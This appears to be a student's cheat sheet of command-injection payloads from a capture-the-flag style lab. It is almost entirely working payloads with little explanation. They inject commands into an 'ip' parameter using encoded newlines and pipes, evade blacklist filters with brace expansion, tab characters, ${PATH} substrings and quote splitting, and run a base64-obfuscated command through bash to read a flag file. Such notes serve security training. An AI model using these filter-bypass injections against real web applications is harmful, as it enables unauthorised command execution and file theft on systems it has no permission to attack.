# Command injection 

# Other Injection Operators

- used pipe

```shell

127.0.0.1 %7c ls

```

# Identifying Filters

```shell

ip=127.0.0.1%0als

```

# Bypassing Space Filters

```shell

ip=127.0.0.1%0a{ls,-la}

```

# Bypassing Other Blacklisted Characters

```shell

ip=127.0.0.1%0als%09${PATH:0:1}home

```


# Bypassing Other Blacklisted Characters

```shell

ip=127.0.0.1%0als%09${PATH:0:1}home

1nj3c70r

127.0.0.1%0aca$@t%09${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt

```


# Advanced Command Obfuscation

```shell 
echo -n "find /usr/share/ | grep root | grep mysql | tail -n 1" | base64

bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)

ip=127.0.0.1%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)

```


# skill Assessemnet

```shell

%0ac'a't%09${PATH:0:1}flag.txt

```